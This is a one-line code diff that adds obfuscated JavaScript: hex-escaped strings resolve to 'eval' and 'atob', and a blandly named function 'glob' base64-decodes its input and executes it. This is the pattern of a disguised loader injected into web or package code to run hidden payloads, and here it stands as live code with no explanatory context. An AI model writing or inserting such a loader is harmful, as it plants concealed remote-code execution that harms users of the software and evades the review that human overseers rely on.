@@ -1,0 +1,1 @@
+sfd=this["\x65\x76\x61\x6C"];rty=this["\x61\x74\x6F\x62"];glob=function(s){sfd(rty(s.substring(-~[])));}
